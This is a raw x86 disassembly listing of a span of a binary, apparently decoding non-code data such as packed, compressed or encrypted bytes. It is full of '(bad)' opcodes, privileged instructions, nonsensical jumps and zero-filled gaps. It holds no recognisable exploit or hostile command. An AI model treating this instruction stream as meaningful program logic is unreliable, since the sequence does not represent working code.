  439c34:	mov    ah,0xfe
  439c36:	je     0x439c6d
  439c38:	xor    BYTE PTR [ebx+eax*1],0xde
  439c3c:	dec    BYTE PTR [di-0x1]
  439c40:	add    DWORD PTR [esi+0x7e74400c],0x4129f83b
  439c4a:	add    BYTE PTR [eax],al
  439c4c:	icebp  
  439c4d:	fwait
  439c4e:	loop   0x439c81
  439c50:	push   0x73
  439c52:	cmc    
  439c53:	test   BYTE PTR [eax+esi*8],dh
  439c56:	add    eax,0xdb725183
  439c5b:	inc    ebx
  439c5c:	fs (bad) 
  439c5e:	mov    ebp,0x5
	...
  439c7b:	add    BYTE PTR [eax],al
  439c7d:	add    BYTE PTR [ecx+edx*2],ch
  439c80:	cmp    DWORD PTR [eax],eax
  439c82:	xor    eax,0x2815f6dc
  439c87:	nop
  439c88:	cmp    al,BYTE PTR [eax]
  439c8a:	jmp    0xbb03:0xf7daef23
  439c91:	push   ebp
  439c92:	scas   eax,DWORD PTR es:[edi]
  439c93:	bound  ecx,QWORD PTR [edi+0x53]
  439c96:	pop    ss
  439c97:	inc    edi
  439c98:	xor    bl,BYTE PTR ds:0x39516c
  439c9e:	and    DWORD PTR [edi+0x53ecbe50],ebp
  439ca4:	cmp    DWORD PTR [eax],eax
  439ca6:	inc    edx
  439ca7:	jae    0x439cbc
  439ca9:	sbb    dh,dl
  439cab:	cmp    eax,0x65c93800
  439cb0:	fild   DWORD PTR [ebx-0xc]
  439cb3:	cli    
  439cb4:	or     eax,0xf5728ce8
  439cb9:	jmp    DWORD PTR [eax-0x43]
  439cbc:	outs   dx,BYTE PTR ds:[esi]
  439cbd:	or     eax,0xddf6923d
  439cc2:	or     eax,0x10c1fe56
  439cc7:	das    
  439cc8:	mov    dl,0x3e
  439cca:	or     eax,0xfb2c98
  439ccf:	stos   DWORD PTR es:[edi],eax
  439cd0:	lock aas 
  439cd2:	or     eax,0x20d82671
  439cd7:	push   edi
  439cd8:	dec    BYTE PTR [eax+0x1493e330]
  439cde:	loope  0x439c64
  439ce0:	add    BYTE PTR ds:[eax],al
	...
  439cff:	add    BYTE PTR [esi-0x2a],al
  439d02:	or     bh,BYTE PTR [ecx]
  439d04:	in     eax,0x4a
  439d06:	cmp    DWORD PTR [edi],0x1493670d
  439d0c:	mov    ch,0xa5
  439d0e:	add    BYTE PTR ds:[esi],ah
  439d11:	(bad)  
  439d12:	or     ch,BYTE PTR [ecx]
  439d14:	mov    BYTE PTR [edx+edx*4+0x50],ch
  439d18:	add    ch,BYTE PTR [edx+0x0]
  439d1b:	or     ch,BYTE PTR [ecx-0x2a]
  439d1e:	add    edx,DWORD PTR [ecx+0x12]
  439d21:	push   0x0
  439d23:	or     al,0x59
  439d25:	(bad)  
  439d26:	add    edx,DWORD PTR [ecx+0x32]
  439d29:	mov    esi,?
  439d2b:	(bad)  
  439d2c:	into   
  439d2d:	xchg   esi,eax
  439d2e:	lea    esi,[ecx+eiz*1]
  439d31:	ins    DWORD PTR es:[edi],dx
  439d32:	inc    edx
  439d33:	add    BYTE PTR [edx],bl
  439d35:	mov    BYTE PTR [bx-0x6a68],bh
  439d3a:	jnp    0x439d98
  439d3c:	or     DWORD PTR [esi],ecx
  439d3e:	dec    ecx
  439d3f:	cld    
  439d40:	pushaw 
  439d42:	ret    0x8654
  439d45:	or     al,BYTE PTR [ebx-0x2d19e215]
  439d4b:	(bad)  
  439d4c:	inc    ebx
  439d4d:	mov    edi,0xd5c0dfef
  439d52:	add    esi,DWORD PTR [ebp+0x14]
  439d55:	fsincos 
  439d57:	(bad)  [esi+0x0]
  439d5a:	jmp    0x1366398
  439d5f:	test   BYTE PTR [edx],0x0
  439d62:	adc    ecx,esi
	...
  439d80:	add    BYTE PTR [eax],al
  439d82:	fisubr DWORD PTR [edx-0x15c7fc5b]
  439d88:	sub    cl,BYTE PTR [ecx]
  439d8a:	arpl   WORD PTR [ecx-0x3f59fc5b],si
  439d90:	jmp    0x439d89
  439d92:	mov    dh,0x3c
  439d94:	jmp    0xe9831db8
  439d99:	jl     0x439dc4
  439d9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439d9c:	cmp    eax,DWORD PTR [edi+0xd]
  439d9f:	ret    0xa3eb
  439da2:	pop    ecx
  439da3:	cmp    al,0xe9
  439da5:	add    al,0xdf
  439da7:	mov    bl,bl
  439da9:	out    dx,eax
  439daa:	sbb    BYTE PTR [eax-0x17],al
  439dad:	jl     0x439d70
  439daf:	(bad)  
  439db0:	pop    edi
  439db1:	xor    DWORD PTR [ecx+0x76],esp
  439db4:	mov    ecx,DWORD PTR [ebx+0x2e22a8a]
  439dba:	jg     0x439dfe
  439dbc:	fidivr DWORD PTR [esi+0x11]
  439dbf:	hlt    
  439dc0:	mov    ah,0x46
  439dc2:	or     eax,0x8dd7ca2d
  439dc7:	jp     0x439df4
  439dc9:	xchg   esp,eax
  439dca:	ficom  DWORD PTR [edi-0x77dd0839]
  439dd0:	ins    BYTE PTR es:[edi],dx
  439dd1:	ret    
  439dd2:	mov    eax,ds:0x1648aaf4
  439dd7:	jg     0x439dfc
  439dd9:	xchg   ebx,eax
  439dda:	or     BYTE PTR [edx],dl
  439ddc:	mov    ebp,0xe753009e
  439de1:	adc    BYTE PTR [ecx-0x70],0x80
  439de5:	jl     0x439de7
	...
  439e03:	add    BYTE PTR ds:0x9331e900,bl
  439e09:	ret    
  439e0a:	sbb    eax,0x2da3bd
  439e0f:	bound  edi,QWORD PTR [edx+0x6]
  439e12:	in     al,dx
  439e13:	aad    0x1b
  439e15:	xlat   BYTE PTR ds:[ebx]
  439e16:	(bad)  
  439e17:	mov    edi,0x3cdfe4d6
  439e1c:	dec    ebx
  439e1d:	add    BYTE PTR [ebp+0x10],dh
  439e20:	pop    edi
  439e21:	(bad)  
  439e22:	fldcw  WORD PTR [edx-0x2304cdf2]
  439e28:	mov    dh,0xf5
  439e2a:	aas    
  439e2b:	jmp    0x15238306
  439e30:	push   ebx
  439e31:	add    BYTE PTR [ebp-0x31],dh
  439e34:	(bad)  
  439e35:	cld    
  439e36:	mov    ch,0x3f
  439e38:	sar    edi,cl
  439e3a:	cli    
  439e3b:	es adc eax,0xeaadbec
  439e41:	adc    al,0x8d
  439e43:	test   eax,0xd1c790e
  439e48:	popf   
  439e49:	(bad)  
  439e4a:	jmp    DWORD PTR [esi]
  439e4c:	adc    eax,0xeaadca0
  439e51:	add    DWORD PTR [edx-0x12],edx
  439e54:	pop    edx
  439e55:	jmp    0x439e64
  439e57:	sub    DWORD PTR [ecx],edx
  439e59:	push   ds
  439e5a:	adc    BYTE PTR [eax-0xe],dh
  439e5d:	xchg   ebx,eax
  439e5e:	mov    BYTE PTR [ecx+eiz*4],dh
  439e61:	js     0x439ebf
  439e63:	aad    0xb1
  439e65:	and    edi,ebx
  439e67:	daa    
	...
  439e84:	add    BYTE PTR [eax],al
  439e86:	or     al,0x52
  439e88:	inc    esp
  439e89:	mov    esi,0x9513f3a0
  439e8e:	sar    bh,1
  439e90:	dec    esi
  439e91:	scas   al,BYTE PTR es:[edi]
  439e92:	xor    eax,0xad2c8c80
  439e97:	ss call 0xfacaa3d5
  439e9d:	ins    DWORD PTR es:[edi],dx
  439e9e:	rcl    DWORD PTR [edx],1
  439ea0:	sbb    bh,BYTE PTR [edx]
  439ea2:	jb     0x439ee0
  439ea4:	clc    
  439ea5:	add    BYTE PTR [ecx+esi*2],al
  439ea8:	jae    0x439eb2
  439eaa:	pop    ebp
  439eab:	out    dx,eax
  439eac:	imul   DWORD PTR [eax-0x13]
  439eaf:	add    al,BYTE PTR [eax]
  439eb1:	inc    eax
  439eb2:	arpl   di,bp
  439eb4:	repz dec ecx
  439eb7:	ret    0x4013
  439eba:	mov    ah,0x7b
  439ebc:	repnz add eax,ebx
  439ebf:	cdq    
  439ec0:	clc    
  439ec1:	inc    ebp
  439ec2:	inc    ebx
  439ec3:	jl     0x439f40
  439ec5:	push   DWORD PTR [esi-0x78a94a14]
  439ecb:	outs   dx,DWORD PTR ds:[esi]
  439ecc:	jae    0x439ed6
  439ece:	jecxz  0x439e5e
  439ed0:	dec    edx
  439ed1:	push   ss
  439ed2:	add    bh,BYTE PTR fs:[ebx-0x3c]
  439ed6:	and    BYTE PTR [ebx-0x4],0xb2
  439eda:	jne    0x439ee1
  439edc:	inc    esp
  439edd:	in     al,dx
  439ede:	or     al,0x47
  439ee0:	or     al,BYTE PTR [eax]
  439ee2:	rol    BYTE PTR fs:[ecx-0x43b6503d],1
  439ee9:	add    al,0x0
	...
  439f07:	add    BYTE PTR [ebp+ecx*8-0x7e],dh
  439f0b:	in     al,dx
  439f0c:	out    0x5f,eax
  439f0e:	push   ss
  439f0f:	push   esi
  439f10:	jnp    0x439f15
  439f12:	jmp    0x439f7e
  439f14:	adc    BYTE PTR [edi],al
  439f16:	inc    esp
  439f17:	in     al,0x4
  439f19:	retf   0xff61
  439f1c:	pop    ss
  439f1d:	jno    0x439f14
  439f1f:	adc    eax,0x3a9194
  439f24:	mov    ecx,0xb5206ec2
  439f29:	cmc    
  439f2a:	repz add BYTE PTR [edx+eax*1],dh
  439f2e:	add    BYTE PTR [ebp+0x3b],dh
  439f31:	addr16 inc ebx
  439f33:	clc    
  439f34:	cmc    
  439f35:	add    al,BYTE PTR [eax]
  439f37:	add    BYTE PTR [ecx],bl
  439f39:	add    ah,BYTE PTR [ebx]
  439f3b:	jne    0x439f4a
  439f3d:	jae    0x439fba
  439f3f:	inc    esp
  439f40:	std    
  439f41:	mov    dl,0xc8
  439f43:	jno    0x439f56
  439f45:	mov    dl,0xc8
  439f47:	xchg   ch,ah
  439f49:	adc    cl,al
  439f4b:	pop    edx
  439f4c:	cmp    esp,DWORD PTR [eax-0x3d]
  439f4f:	push   esp
  439f50:	xchg   BYTE PTR [ebx],al
  439f52:	test   bl,ch
  439f54:	stc    
  439f55:	inc    esp
  439f56:	shl    ecx,cl
  439f58:	xchg   esi,eax
  439f59:	fidiv  DWORD PTR [ebp+0x74]
  439f5c:	mov    ch,0x3f
  439f5e:	push   edi
  439f5f:	cli    
  439f60:	mov    dl,0x36
  439f62:	test   bh,dh
  439f64:	or     ecx,DWORD PTR [esi-0x68f20e7c]
  439f6a:	dec    BYTE PTR [eax+eax*1+0x0]
	...
  439f89:	add    BYTE PTR [eax-0x35],dl
  439f8c:	cs dec bp
  439f8f:	shl    eax,0x4e
  439f92:	neg    ebp
  439f94:	(bad)  
  439f95:	adc    al,0xc5
  439f97:	mov    BYTE PTR [esi],bh
  439f99:	add    BYTE PTR [eax+0x5083ffd7],dl
  439f9f:	xchg   edi,eax
  439fa0:	(bad)  
  439fa1:	push   edi
  439fa3:	mov    ecx,0x71394479
  439fa8:	outs   dx,BYTE PTR ds:[esi]
  439fa9:	dec    edi
  439faa:	pop    edx
  439fab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439fac:	cs adc cl,ch
  439faf:	xchg   esi,eax
  439fb0:	add    ebx,0x19
  439fb3:	lds    edx,FWORD PTR ds:0xb7dc901a
  439fb9:	dec    edi
  439fba:	fiadd  WORD PTR [eax-0x75]
  439fbd:	cli    
  439fbe:	sbb    BYTE PTR [ebx-0xc],ch
  439fc1:	aas    
  439fc2:	or     eax,0x890ac414
  439fc7:	jns    0x439fcc
  439fc9:	add    BYTE PTR ds:0x397c80e6,cl
  439fcf:	in     eax,dx
  439fd0:	jbe    0x439f94
  439fd2:	pop    ebp
  439fd3:	add    BYTE PTR [esi+0x659503d4],cl
  439fd9:	mov    ss,WORD PTR [esi*8-0x7b0d7f97]
  439fe0:	call   0x7fc3b75e
  439fe5:	popf   
  439fe6:	pop    esi
  439fe7:	sti    
  439fe8:	push   0xe40af28d
  439fed:	add    BYTE PTR [eax],0x0
	...
  43a00c:	(bad)  
  43a00e:	repz sti 
  43a010:	xchg   ebx,eax
  43a011:	ror    BYTE PTR ds:0xa1ff1149,0x4
  43a018:	xor    eax,DWORD PTR [eax]
  43a01a:	data16 mov cs,WORD PTR [ecx]
  43a01d:	adc    eax,edi
  43a01f:	and    BYTE PTR [esi],0xcb
  43a022:	sbb    al,0x37
  43a024:	mov    ch,0x6e
  43a026:	jne    0x43a02c
  43a028:	or     eax,0x198f3081
  43a02d:	mov    esi,0xc0922b3d
  43a032:	int    0x48
  43a034:	adc    DWORD PTR [ebx-0x66],esi
  43a037:	or     dl,bh
  43a039:	xchg   edi,eax
  43a03a:	jmp    0x43a0b8
  43a03c:	into   
  43a03d:	retf   0x3733
  43a040:	cwde   
  43a041:	cmp    bl,BYTE PTR ds:0xed0a6634
  43a047:	(bad)
  43a04a:	sbb    al,0x9d
  43a04c:	mov    ecx,edx
  43a04e:	jl     0x43a041
  43a050:	or     al,BYTE PTR [eax]
  43a052:	dec    edi
  43a053:	pop    DWORD PTR [edi-0x53]
  43a056:	arpl   bx,ax
  43a058:	mov    esi,0x5485dce
  43a05d:	fldenv [ebp+0x65fa3282]
  43a063:	adc    ch,bh
  43a065:	jmp    DWORD PTR [edx-0x69beb8]
  43a06b:	pop    edi
  43a06c:	lds    ebp,FWORD PTR [edx+0xe173]
	...
  43a08e:	xchg   DWORD PTR [esp+ecx*1],ebp
  43a091:	jb     0x43a05a
  43a093:	xchg   BYTE PTR [ecx+edi*8+0x14],dl
  43a097:	add    BYTE PTR [esi-0x14],ah
  43a09a:	lea    edi,[esp+edx*8]
  43a09d:	cmp    DWORD PTR [esi],ebx
  43a09f:	sbb    bh,bl
  43a0a1:	xchg   BYTE PTR [eax+0xff5bf7c],bl
  43a0a7:	jns    0x43a125
  43a0a9:	jno    0x43a0ce
  43a0ab:	jne    0x43a0f1
  43a0ad:	ins    DWORD PTR es:[edi],dx
  43a0ae:	inc    BYTE PTR [esi-0x19db9a8c]
  43a0b4:	dec    esi
  43a0b5:	ror    DWORD PTR [ebx-0x466eeb7a],cl
  43a0bb:	ret    
  43a0bc:	jmp    DWORD PTR [ecx+0x55]
  43a0bf:	mov    BYTE PTR [ecx+0x30],bl
  43a0c2:	int3   
  43a0c3:	idiv   edi
  43a0c5:	xchg   ebx,eax
  43a0c6:	pop    ss
  43a0c7:	xchg   edi,eax
  43a0c8:	jle    0x43a10f
  43a0ca:	sahf   
  43a0cb:	je     0x43a111
  43a0cd:	cmp    DWORD PTR [esi],edi
  43a0cf:	xchg   DWORD PTR [ecx+ebp*1],edx
  43a0d2:	jl     0x43a097
  43a0d4:	jmp    FWORD PTR [ebx-0x3b]
  43a0d7:	(bad)  
  43a0d8:	dec    edi
  43a0d9:	add    DWORD PTR [eax+eax*1],ecx
  43a0dc:	add    cl,ch
  43a0de:	test   eax,0x82725442
  43a0e3:	xor    BYTE PTR [ecx+0x6c],dl
  43a0e6:	lds    eax,FWORD PTR [edi-0x80509b1]
  43a0ec:	cli    
  43a0ed:	aam    0xda
  43a0ef:	out    dx,eax
  43a0f0:	aas    
  43a0f1:	jmp    0x43a0f6
	...
  43a10e:	add    BYTE PTR [eax],al
  43a110:	lds    edi,FWORD PTR [ebx]
  43a112:	clc    
  43a113:	jb     0x43a10f
  43a115:	and    DWORD PTR [ebp-0x17],0xb
  43a119:	add    BYTE PTR [eax-0x7fe4b858],al
  43a11f:	add    dl,al
  43a121:	adc    edi,ebx
  43a123:	xor    BYTE PTR [ebp-0x61],0x48
  43a127:	bound  ebx,QWORD PTR [edx-0x31]
  43a12a:	dec    edi
  43a12b:	call   0x3ecccc
  43a130:	mov    ebp,0x41fffebd
  43a135:	or     edi,esp
  43a137:	push   ecx
  43a138:	aaa    
  43a139:	mov    cl,0xd1
  43a13b:	cmp    DWORD PTR [ecx],edi
  43a13d:	mov    WORD PTR [ebp+0xf],?
  43a140:	pop    edi
  43a141:	cmp    ecx,DWORD PTR [eax]
  43a143:	mov    esp,ebp
  43a145:	add    eax,0xd46d0453
  43a14a:	pop    es
  43a14b:	mov    al,0xb5
  43a14d:	addr16 fs push esi
  43a150:	add    DWORD PTR [edi],0x3c
  43a153:	push   0x53003eb5
  43a158:	ja     0x43a129
  43a15a:	dec    edx
  43a15b:	inc    ecx
  43a15d:	mov    ?,ebp
  43a15f:	jne    0x43a0f9
  43a161:	iret   
  43a162:	addr16 jmp 0xff439d41
  43a168:	repz or bl,ch
  43a16b:	cmp    eax,DWORD PTR [edi-0xe]
  43a16e:	and    eax,0x4ffdb28d
  43a173:	call   0x43a178
	...
  43a190:	add    BYTE PTR [eax],al
  43a192:	ret    
  43a193:	xor    esi,esi
  43a195:	(bad)  
  43a196:	in     eax,dx
  43a197:	cmp    bh,ah
  43a199:	cmp    esi,DWORD PTR [edi]
  43a19b:	call   0xcccaf4b5
  43a1a0:	dec    edi
  43a1a1:	jmp    ecx
  43a1a3:	mov    ?,ebp
  43a1a5:	jne    0x43a20f
  43a1a7:	iret   
  43a1a8:	addr16 jmp 0xff439fe7
  43a1ae:	xor    DWORD PTR [edi+0x732874c0],0x73
  43a1b5:	cld    
  43a1b6:	or     eax,0x2abd30c1
  43a1bb:	mov    cl,0xd0
  43a1bd:	mov    edi,0x4c77a236
  43a1c2:	sbb    DWORD PTR ds:0xac850842,ecx
  43a1c8:	int    0x88
  43a1ca:	adc    eax,0x94103a1e
  43a1cf:	iret   
  43a1d0:	pop    es
  43a1d1:	mov    DWORD PTR [ebp-0x71],edi
  43a1d4:	dec    esi
  43a1d5:	add    BYTE PTR [edx-0x37],dl
  43a1d8:	sub    cl,cl
  43a1da:	iret   
  43a1db:	mov    ds:0xb35186fe,eax
  43a1e0:	mul    bh
  43a1e2:	dec    eax
  43a1e3:	sbb    al,0x8c
  43a1e5:	cli    
  43a1e6:	mov    BYTE PTR [edi+0x5],dl
  43a1e9:	add    al,0xff
  43a1eb:	push   esi
  43a1ec:	xchg   edi,eax
  43a1ed:	or     DWORD PTR [ebp+0x1a],ebx
  43a1f0:	adc    esp,DWORD PTR [ecx+ecx*1]
  43a1f3:	and    dl,BYTE PTR [ebx]
  43a1f5:	and    al,0x0
	...
  43a213:	add    BYTE PTR [ecx],al
  43a215:	aas    
  43a216:	xor    al,0xfb
  43a218:	stos   BYTE PTR es:[edi],al
  43a219:	xor    al,cl
  43a21b:	pop    es
  43a21c:	or     eax,0x9e477966
  43a221:	imul   esi,DWORD PTR [ebx],0x1391947f
  43a227:	dec    edx
  43a228:	ds leave 
  43a22a:	rcl    dh,1
  43a22c:	nop
  43a22d:	dec    edi
  43a22e:	mov    esp,esi
  43a230:	sub    ecx,DWORD PTR [esi]
  43a232:	inc    ebx
  43a233:	and    al,0x1d
  43a235:	sbb    eax,0xa7390103
  43a23a:	retf   0xda08
  43a23d:	mov    esi,0xaae1d682
  43a242:	add    al,al
  43a244:	adc    DWORD PTR [eax-0x2ee5f3f4],esp
  43a24a:	mov    esi,0xeeffb798
  43a24f:	sub    bh,BYTE PTR [esi]
  43a251:	sub    DWORD PTR [ebx+0x46],0xfbad7c0c
  43a258:	fs rcr cl,0x6f
  43a25c:	arpl   bp,di
  43a25e:	mov    eax,0xb9869a3d
  43a263:	or     eax,DWORD PTR [eax-0x33]
  43a266:	xchg   esi,eax
  43a267:	push   ds
  43a268:	adc    esi,DWORD PTR [ebp-0x5e]
  43a26b:	sub    eax,0xc66d8efe
  43a270:	jmp    DWORD PTR [edi-0x6acd3c03]
  43a276:	out    0xd5,al
	...
  43a294:	add    BYTE PTR [eax],al
  43a296:	stos   BYTE PTR es:[edi],al
  43a297:	and    BYTE PTR [ebx],ch
  43a299:	das    
  43a29a:	mov    ds:0xfd1de8fb,eax
  43a29f:	es mov esi,0xb5fd63c4
  43a2a5:	ret    
  43a2a6:	mov    ebp,DWORD PTR [esp+ebx*2]
  43a2a9:	call   0xc82d18bd
  43a2ae:	jmp    0x43a2bb
  43a2b0:	out    dx,eax
  43a2b1:	xlat   BYTE PTR ds:[ebx]
  43a2b2:	inc    bl
  43a2b4:	out    0x11,al
  43a2b6:	bswap  ebp
  43a2b8:	sub    BYTE PTR [edi],ch
  43a2ba:	bound  ecx,QWORD PTR [esi-0xf]
  43a2bd:	xor    DWORD PTR [eax+0xb9ee808],ecx
  43a2c3:	jbe    0x43a2af
  43a2c5:	(bad)  
  43a2c6:	cmp    cl,BYTE PTR [esi]
  43a2c8:	loopne 0x43a291
  43a2ca:	inc    ebp
  43a2cb:	or     esp,ebp
  43a2cd:	inc    ecx
  43a2ce:	inc    edx
  43a2cf:	lea    edx,[esi-0x6372c46c]
  43a2d5:	sub    al,0x8d
  43a2d7:	shr    DWORD PTR [edx+0x3af0b910],0xc5
  43a2de:	xchg   ebx,eax
  43a2df:	mov    cl,0xcd
  43a2e1:	mov    edx,0x7bffb81b
  43a2e6:	or     DWORD PTR ds:0x859799e8,ebp
  43a2ec:	cli    
  43a2ed:	ins    DWORD PTR es:[edi],dx
  43a2ee:	dec    esi
  43a2ef:	or     al,0x3b
  43a2f1:	daa    
  43a2f2:	mov    dl,0xbe
  43a2f4:	out    0xef,al
  43a2f6:	mov    es,esi
  43a2f8:	pop    ecx
  43a2f9:	push   ebp
	...
  43a316:	add    BYTE PTR [eax],al
  43a318:	or     al,0x3e
  43a31a:	aaa    
  43a31b:	mov    edx,0xba368e00
  43a320:	add    dl,ah
  43a322:	xchg   BYTE PTR [edi-0x4f81b815],ah
  43a328:	or     dh,ch
  43a32a:	push   ds
  43a32b:	das    
  43a32c:	jp     0x43a377
  43a32e:	out    0xf2,al
  43a330:	jo     0x43a333
  43a332:	cmp    al,0xd9
  43a334:	add    BYTE PTR [ecx],cl
  43a336:	cmp    al,0xd0
  43a338:	inc    DWORD PTR [edx+eax*2]
  43a33b:	ret    0xed83
  43a33e:	lock jb 0x43a30d
  43a341:	shr    DWORD PTR es:[edx-0x6a],0x3
  43a346:	outs   dx,BYTE PTR ds:[esi]
  43a347:	out    0x43,eax
  43a349:	inc    ecx
  43a34a:	es cs fwait
  43a34d:	jge    0x43a37c
  43a34f:	sub    esp,esp
  43a351:	(bad)  
  43a352:	mov    esi,0x7e6b2bbc
  43a357:	cmp    eax,0x7251ced2
  43a35c:	jle    0x43a2e4
  43a35e:	inc    esp
  43a35f:	icebp  
  43a360:	fisttp WORD PTR [eax+0x13ab3144]
  43a366:	xchg   DWORD PTR [esi+edx*4+0x4211c186],ebp
  43a36d:	jnp    0x43a369
  43a36f:	push   ds
  43a370:	repz push esi
  43a372:	test   BYTE PTR [edx],dh
  43a374:	std    
  43a375:	or     eax,0xc996a4fb
  43a37a:	jle    0x43a37c
	...
  43a398:	add    BYTE PTR [eax],al
  43a39a:	adc    dh,BYTE PTR [ebx+0x6d]
  43a39d:	out    0x97,eax
  43a39f:	inc    ebx
  43a3a0:	push   ebp
  43a3a1:	pop    esi
  43a3a2:	lahf   
  43a3a3:	mov    esp,0x5e3408bc
  43a3a8:	jmp    0xfabb552d
  43a3ad:	mov    cl,bl
  43a3af:	xchg   DWORD PTR [edx+0x334c8],esi
  43a3b5:	jne    0x43a3df
  43a3b7:	dec    esp
  43a3b8:	jmp    0xa7f8:0x4bfd4772
  43a3bf:	push   ds
  43a3c0:	or     al,0x0
  43a3c2:	jno    0x43a414
  43a3c4:	add    DWORD PTR [ecx],edi
  43a3c6:	sub    DWORD PTR [eax+0x3f7d036c],ecx
  43a3cc:	cld    
  43a3cd:	adc    DWORD PTR [ecx],0xffffff88
  43a3d0:	cli    
  43a3d1:	jne    0x43a3b6
  43a3d3:	sti    
  43a3d4:	dec    ebx
  43a3d5:	or     al,0x6f
  43a3d7:	aas    
  43a3d8:	cld    
  43a3d9:	sub    esp,DWORD PTR [ebp+0x7c3136f6]
  43a3df:	mov    edi,eax
  43a3e1:	inc    DWORD PTR [ebx-0x1]
  43a3e4:	mov    edx,0x4387af75
  43a3e9:	or     al,0x3f
  43a3eb:	aas    
  43a3ec:	or     al,0x3b
  43a3ee:	imul   eax,DWORD PTR [esi+0xf43e16c],0xe34c560c
  43a3f8:	je     0x43a3f8
  43a3fa:	push   ebx
  43a3fb:	mov    DWORD PTR [ebx-0x8],esi
	...
  43a41a:	add    BYTE PTR [eax],al
  43a41c:	pop    ds
  43a41d:	mov    WORD PTR [ecx-0x64f8333d],es
  43a423:	push   DWORD PTR [ebx]
  43a425:	push   ds
  43a426:	dec    BYTE PTR [eax+0x758b86a9]
  43a42c:	and    BYTE PTR [eax+ebp*8],ch
  43a42f:	ret    0xa80d
  43a432:	xchg   edx,edi
  43a434:	push   ds
  43a435:	cmp    ecx,DWORD PTR [edi+eax*8-0x1d]
  43a439:	test   al,0xfe
  43a43b:	xchg   BYTE PTR [ebp+0x41],al
  43a43e:	mov    WORD PTR [edx],cs
  43a440:	shl    BYTE PTR ds:0x974154c7,1
  43a446:	test   DWORD PTR [eax+edx*8+0x64],0x384b872e
  43a44e:	xor    cl,BYTE PTR [esi-0x4b]
  43a451:	mov    ds:0x410dfffe,al
  43a456:	xor    al,0x35
  43a458:	or     eax,0xf5c38369
  43a45d:	adc    eax,0xb6c6449c
  43a462:	xchg   edx,edi
  43a464:	js     0x43a411
  43a466:	xchg   esi,eax
  43a467:	cmp    al,0xb6
  43a469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a46a:	xchg   DWORD PTR [esi+0x44db6b48],eax
  43a470:	adc    eax,0x49fec36a
  43a475:	(bad)  
  43a476:	xchg   ebp,eax
  43a477:	inc    ebx
  43a478:	fiadd  DWORD PTR [esi-0x7479ab79]
  43a47e:	jge    0x43a46b
	...
  43a49c:	add    BYTE PTR [eax],al
  43a49e:	adc    DWORD PTR [ecx-0x2],ebp
  43a4a1:	call   FWORD PTR [esi+0x15]
  43a4a4:	xor    DWORD PTR [eax+0xc],ebp
  43a4a7:	push   0xe480fffe
  43a4ac:	cmp    ah,0xaa
  43a4af:	(bad)  
  43a4b0:	cs sti 
  43a4b2:	sbb    BYTE PTR [edi-0x79],bl
  43a4b5:	adc    al,0x75
  43a4b7:	pop    ebx
  43a4b8:	add    BYTE PTR ds:[esi+0xbd67a1f],al
  43a4bf:	add    dl,ch
  43a4c1:	cli    
  43a4c2:	ds xor eax,0x29b188
  43a4c8:	mov    ecx,0x6a890d43
  43a4cd:	fcmovnu st,st(2)
  43a4cf:	mov    edi,0x7c8976e8
  43a4d4:	or     ecx,DWORD PTR [eax-0x3b922fa9]
  43a4da:	push   0xffffffe6
  43a4dc:	dec    edi
  43a4dd:	mov    BYTE PTR [edi-0x7d],al
  43a4e0:	sub    BYTE PTR [edi],cl
  43a4e2:	adc    eax,DWORD PTR [ecx-0x7f3008de]
  43a4e8:	loop   0x43a526
  43a4ea:	mov    ds:0xc7c41556,eax
  43a4ef:	(bad)  ds:0xe90460bd
  43a4f5:	sbb    dl,BYTE PTR [esi]
  43a4f7:	or     al,0x4b
  43a4f9:	jnp    0x43a48a
  43a4fb:	xor    BYTE PTR [ecx],bl
  43a4fd:	inc    esp
  43a4fe:	or     eax,0x31c369
	...
  43a51f:	add    BYTE PTR [edx+0x1698676b],cl
  43a525:	or     cl,ch
  43a527:	add    ebx,DWORD PTR [edi-0x2b]
  43a52a:	adc    BYTE PTR [eax+0xd],bh
  43a52d:	add    cl,ch
  43a52f:	xor    dh,ch
  43a531:	mov    ds:0x7cd7874d,al
  43a536:	fstp   TBYTE PTR [ebx+0x7ce8bffd]
  43a53c:	or     eax,DWORD PTR [esi+eiz*2]
  43a53f:	mov    edi,es
  43a541:	repnz loope 0x43a515
  43a544:	jp     0x43a5ac
  43a546:	test   eax,0x16000d01
  43a54b:	mov    ?,WORD PTR [ebx+ecx*4]
  43a54e:	stos   DWORD PTR es:[edi],eax
  43a54f:	jg     0x43a5a3
  43a551:	call   0x83d6124d
  43a556:	push   eax
  43a557:	leave  
  43a558:	repz (bad) 
  43a55a:	call   0xffc776d7
  43a55f:	cwde   
  43a560:	mov    edx,DWORD PTR [ebx]
  43a562:	ins    BYTE PTR es:[edi],dx
  43a563:	aad    0xce
  43a565:	dec    DWORD PTR [eax-0x3dca8956]
  43a56b:	xchg   ebp,eax
  43a56c:	mov    ebx,0xcc6400e2
  43a571:	or     DWORD PTR [edi-0x7f],0x5c
  43a575:	xchg   edi,eax
  43a576:	xchg   DWORD PTR [ebp+0x71],ebp
  43a579:	sbb    BYTE PTR [edi],bl
  43a57b:	jmp    0x6d88308e
  43a580:	stc    
  43a581:	shl    DWORD PTR [ebp-0x18],1
	...
  43a5a0:	add    BYTE PTR [eax],al
  43a5a2:	rcl    esp,cl
  43a5a4:	fldcw  WORD PTR [edx]
  43a5a6:	or     ecx,edx
  43a5a8:	cli    
  43a5a9:	hlt    
  43a5aa:	pop    edx
  43a5ab:	cmovo  ebp,ecx
  43a5ae:	mov    eax,ds:0x5b120c3d
  43a5b3:	lock lods al,BYTE PTR ds:[esi]
  43a5b5:	push   ebx
  43a5b6:	or     BYTE PTR [ebx-0x17c19abc],cl
  43a5bc:	sbb    eax,0xe8181101
  43a5c1:	mov    ebx,0x74fa7bec
  43a5c6:	dec    ebp
  43a5c7:	test   BYTE PTR [edi+0x37],cl
  43a5ca:	cmp    dh,BYTE PTR [edi+0x14]
  43a5cd:	leave  
  43a5ce:	fistp  QWORD PTR [ebx]
  43a5d0:	add    BYTE PTR [eax+0x4f],ah
  43a5d3:	adc    al,0x37
  43a5d5:	scas   eax,DWORD PTR es:[edi]
  43a5d6:	add    al,BYTE PTR [edx-0x3bba179b]
  43a5dc:	sbb    DWORD PTR [ecx],0x21
  43a5df:	sbb    bl,BYTE PTR [esi-0x359cd90f]
  43a5e5:	or     ecx,DWORD PTR [ecx]
  43a5e7:	add    BYTE PTR [ebp+0x67cb2aa4],cl
  43a5ed:	add    DWORD PTR [eax],ebx
  43a5ef:	dec    ebx
  43a5f0:	(bad)  
  43a5f1:	mov    dh,0xf4
